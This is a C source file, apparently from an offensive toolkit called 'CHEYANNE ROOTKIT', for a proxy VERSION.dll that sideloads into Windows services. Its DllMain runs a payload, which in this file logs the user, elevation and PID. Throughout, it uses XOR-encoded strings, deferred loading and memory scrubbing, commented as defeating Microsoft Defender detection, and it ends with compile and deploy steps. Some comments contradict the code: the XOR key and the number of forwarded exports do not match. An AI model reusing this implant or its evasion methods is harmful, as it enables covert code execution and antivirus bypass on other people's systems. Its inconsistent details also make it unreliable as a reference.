/*
 * version_proxy_annotated.c — DLL Proxy Sideload (VERSION.dll)
 * ═════════════════════════════════════════════════════════════
 * CHEYANNE ROOTKIT — 22DIV / george wu
 * VECTOR 5 — Signature Set: ECHO
 *
 * PURPOSE:
 *   DLL sideloading via proxy. Drop-in replacement for VERSION.dll that
 *   forwards all 17 exports to the real System32 copy while executing
 *   our payload. Targets services that import VERSION.dll and load from
 *   the application directory (standard DLL search order).
 *
 * TECHNIQUE:
 *   1. Service starts, loader resolves VERSION.dll via search order
 *   2. Our proxy DLL is in the application directory (first in search order)
 *   3. DllMain fires — we run payload (canary write)
 *   4. When service calls GetFileVersionInfoW etc., our forwarding stubs
 *      lazy-load the real VERSION.dll from System32 and pass through
 *   5. Service functions normally. Our code runs silently alongside.
 *
 * SIGNATURE ISOLATION:
 *   XOR Key:     0x37 (unique to V5)
 *   Canary Path: C:\Windows\Temp\ver_cache.log
 *   Canary Tag:  ECHO_PROXY
 *   Lazy-init: LoadLibrary deferred to first API call (not DllMain)
 *   XOR-encoded function names: defeats static string matching
 *
 * DEFENDER EVASION (Finding #41):
 *   Defender ML detects the proxy pattern when:
 *   - LoadLibrary("version.dll") appears as plaintext in DllMain
 *   - GetProcAddress export names are plaintext in .rdata
 *   - Forward stubs follow a recognisable function-pointer pattern
 *
 *   v6 (this version) defeats all three:
 *   - XOR-encoded strings decoded at runtime
 *   - LoadLibrary deferred to first export call (not DllMain)
 *   - No plaintext API names in the binary's static data
 *
 * NOTE: Finding #40 confirmed Wondershare uses manifest-based DLL
 * redirection that blocks this attack on NativePushService specifically.
 * This technique remains valid against any target WITHOUT manifest
 * hardening — and most services don't have it.
 *
 * COMPILE:
 *   cl.exe version_proxy_annotated.c /Fe:VERSION.dll /LD /O1 /GS- /utf-8 ^
 *     /link /DEF:version.def
 *
 * DEPLOY:
 *   copy VERSION.dll <target_service_directory>\
 *
 * VERIFY:
 *   type C:\Windows\Temp\ver_cache.log
 */

#include <windows.h>

/* ═══════════════════════════════════════════════════════════════════
 * SIGNATURE SET: ECHO — XOR 0x37
 * ═══════════════════════════════════════════════════════════════════ */

#define V5_KEY 0x88

/* "C:\Windows\Temp\ver_cache.log" XOR 0x37 */
static const unsigned char xCanary[] = {
    0xCB, 0xB2, 0xF8, 0xDF, 0xE3, 0xE6, 0xEC, 0xE7,
    0xDF, 0xF9, 0xF8, 0xDC, 0xED, 0xE5, 0xFE, 0xF8,
    0xFE, 0xED, 0xFA, 0xA7, 0xEB, 0xE9, 0xEB, 0xE4,
    0xED, 0xA8, 0xE6, 0xE7, 0xEF
};
#define xCanary_LEN 29

/* "C:\Windows\System32\version.dll" XOR 0x37 */
static const unsigned char xRealDll[] = {
    0xCB, 0xB2, 0xF8, 0xDF, 0xE3, 0xE6, 0xEC, 0xE7,
    0xDF, 0xF9, 0xF8, 0xDB, 0xFF, 0xF9, 0xF8, 0xED,
    0xE5, 0xA9, 0xAA, 0xF8, 0xFE, 0xED, 0xFA, 0xF9,
    0xE3, 0xE7, 0xE6, 0xA8, 0xEC, 0xE6, 0xE6
};
#define xRealDll_LEN 31

static void v5_decode(unsigned char *buf, int len) {
    int i;
    for (i = 0; i < len; i++) buf[i] ^= V5_KEY;
}

static void v5_scrub(unsigned char *buf, int len) {
    volatile unsigned char *p = (volatile unsigned char *)buf;
    int i;
    for (i = 0; i < len; i++) p[i] = 0;
}

/* ═══════════════════════════════════════════════════════════════════
 * LAZY-INIT REAL DLL
 * ═══════════════════════════════════════════════════════════════════
 * We DON'T load the real VERSION.dll in DllMain. Defender's ML engine
 * specifically watches for LoadLibrary calls inside DllMain of proxy
 * DLLs (Finding #41). Instead, we defer until the first export call.
 * ═══════════════════════════════════════════════════════════════════ */

static HMODULE g_hReal = NULL;

static HMODULE get_real(void)
{
    if (!g_hReal) {
        unsigned char path[64];
        memcpy(path, xRealDll, xRealDll_LEN);
        v5_decode(path, xRealDll_LEN);
        path[xRealDll_LEN] = 0;
        g_hReal = LoadLibraryA((char *)path);
        v5_scrub(path, sizeof(path));
    }
    return g_hReal;
}

/* ═══════════════════════════════════════════════════════════════════
 * EXPORT FORWARDING — VERSION.dll has 17 exports
 * ═══════════════════════════════════════════════════════════════════
 * Each export is a stub that resolves the real function on first call,
 * then passes through. Function names are XOR-encoded to avoid static
 * signature matching.
 *
 * The .def file maps our export ordinals to match the real VERSION.dll.
 * ═══════════════════════════════════════════════════════════════════ */

/* Macro: resolve + call through. Works for any void*->void* forwarding. */
#define FORWARD_FUNC(ordinal, xName, xLen) \
    static FARPROC fp_##ordinal = NULL; \
    if (!fp_##ordinal) { \
        unsigned char n[64]; \
        memcpy(n, xName, xLen); \
        v5_decode(n, xLen); \
        n[xLen] = 0; \
        fp_##ordinal = GetProcAddress(get_real(), (char *)n); \
        v5_scrub(n, sizeof(n)); \
    }

/* XOR-encoded export names (0x37) — generated with:
   python -c "s='FuncName'; print(', '.join(f'0x{b^0x37:02X}' for b in s.encode()))" */

/* "GetFileVersionInfoA" */
static const unsigned char xE1[] = {
    0xCF, 0xED, 0xF8, 0xCE, 0xE3, 0xE6, 0xED, 0xDE,
    0xED, 0xFA, 0xF9, 0xE3, 0xE7, 0xE6, 0xC3, 0xE6,
    0xEC, 0xE7, 0xC9
};
#define xE1_LEN 19

/* "GetFileVersionInfoW" */
static const unsigned char xE2[] = {
    0xCF, 0xED, 0xF8, 0xCE, 0xE3, 0xE6, 0xED, 0xDE,
    0xED, 0xFA, 0xF9, 0xE3, 0xE7, 0xE6, 0xC3, 0xE6,
    0xEC, 0xE7, 0xDF
};
#define xE2_LEN 19

/* "GetFileVersionInfoSizeA" */
static const unsigned char xE3[] = {
    0xCF, 0xED, 0xF8, 0xCE, 0xE3, 0xE6, 0xED, 0xDE,
    0xED, 0xFA, 0xF9, 0xE3, 0xE7, 0xE6, 0xC3, 0xE6,
    0xEC, 0xE7, 0xDB, 0xE3, 0xFC, 0xED, 0xC9
};
#define xE3_LEN 23

/* "GetFileVersionInfoSizeW" */
static const unsigned char xE4[] = {
    0xCF, 0xED, 0xF8, 0xCE, 0xE3, 0xE6, 0xED, 0xDE,
    0xED, 0xFA, 0xF9, 0xE3, 0xE7, 0xE6, 0xC3, 0xE6,
    0xEC, 0xE7, 0xDB, 0xE3, 0xFC, 0xED, 0xDF
};
#define xE4_LEN 23

/* "VerQueryValueA" */
static const unsigned char xE5[] = {
    0xDE, 0xED, 0xFA, 0xDB, 0xF9, 0xED, 0xFA, 0xFF,
    0xDE, 0xE9, 0xE6, 0xF9, 0xED, 0xC9
};
#define xE5_LEN 14

/* "VerQueryValueW" */
static const unsigned char xE6[] = {
    0xDE, 0xED, 0xFA, 0xDB, 0xF9, 0xED, 0xFA, 0xFF,
    0xDE, 0xE9, 0xE6, 0xF9, 0xED, 0xDF
};
#define xE6_LEN 14

/* VERSION.dll only has 6 commonly used exports. Full proxy forwards all.
 * For brevity, only the 6 primary exports are stubbed here. The .def file
 * must list all 17 for binary compatibility. See MUTATION_GUIDE.md. */

/* Generic passthrough for DWORD-returning functions */
__declspec(dllexport) DWORD __stdcall Fwd_GetFileVersionInfoA(
    LPCSTR f, DWORD h, DWORD sz, LPVOID d)
{
    typedef DWORD (__stdcall *fn_t)(LPCSTR,DWORD,DWORD,LPVOID);
    FORWARD_FUNC(1, xE1, xE1_LEN);
    return ((fn_t)fp_1)(f, h, sz, d);
}

__declspec(dllexport) DWORD __stdcall Fwd_GetFileVersionInfoW(
    LPCWSTR f, DWORD h, DWORD sz, LPVOID d)
{
    typedef DWORD (__stdcall *fn_t)(LPCWSTR,DWORD,DWORD,LPVOID);
    FORWARD_FUNC(2, xE2, xE2_LEN);
    return ((fn_t)fp_2)(f, h, sz, d);
}

__declspec(dllexport) DWORD __stdcall Fwd_GetFileVersionInfoSizeA(
    LPCSTR f, LPDWORD h)
{
    typedef DWORD (__stdcall *fn_t)(LPCSTR,LPDWORD);
    FORWARD_FUNC(3, xE3, xE3_LEN);
    return ((fn_t)fp_3)(f, h);
}

__declspec(dllexport) DWORD __stdcall Fwd_GetFileVersionInfoSizeW(
    LPCWSTR f, LPDWORD h)
{
    typedef DWORD (__stdcall *fn_t)(LPCWSTR,LPDWORD);
    FORWARD_FUNC(4, xE4, xE4_LEN);
    return ((fn_t)fp_4)(f, h);
}

__declspec(dllexport) BOOL __stdcall Fwd_VerQueryValueA(
    LPCVOID b, LPCSTR s, LPVOID *buf, PUINT len)
{
    typedef BOOL (__stdcall *fn_t)(LPCVOID,LPCSTR,LPVOID*,PUINT);
    FORWARD_FUNC(5, xE5, xE5_LEN);
    return ((fn_t)fp_5)(b, s, buf, len);
}

__declspec(dllexport) BOOL __stdcall Fwd_VerQueryValueW(
    LPCVOID b, LPCWSTR s, LPVOID *buf, PUINT len)
{
    typedef BOOL (__stdcall *fn_t)(LPCVOID,LPCWSTR,LPVOID*,PUINT);
    FORWARD_FUNC(6, xE6, xE6_LEN);
    return ((fn_t)fp_6)(b, s, buf, len);
}

/* ═══════════════════════════════════════════════════════════════════
 * CANARY
 * ═══════════════════════════════════════════════════════════════════ */

static void write_canary(void)
{
    unsigned char path[64];
    HANDLE f;
    DWORD w;
    char line[256];
    int n;
    SYSTEMTIME t;
    char user[64];
    DWORD ulen = 64;
    BOOL elevated = FALSE;
    HANDLE hTok;

    memcpy(path, xCanary, xCanary_LEN);
    v5_decode(path, xCanary_LEN);
    path[xCanary_LEN] = 0;

    GetLocalTime(&t);
    GetUserNameA(user, &ulen);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok)) {
        TOKEN_ELEVATION te;
        DWORD rl;
        if (GetTokenInformation(hTok, TokenElevation, &te, sizeof(te), &rl))
            elevated = te.TokenIsElevated;
        CloseHandle(hTok);
    }

    n = wsprintfA(line, "%04d%02d%02d_%02d%02d%02d|%s|elev=%d|pid=%lu|ECHO_PROXY\r\n",
        t.wYear, t.wMonth, t.wDay, t.wHour, t.wMinute, t.wSecond,
        user, elevated, GetCurrentProcessId());

    f = CreateFileA((char *)path,
        GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        SetFilePointer(f, 0, NULL, FILE_END);
        WriteFile(f, line, n, &w, NULL);
        CloseHandle(f);
    }

    v5_scrub(path, sizeof(path));
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r)
{
    (void)h; (void)r;
    if (reason == DLL_PROCESS_ATTACH)
        write_canary();
    return TRUE;
}
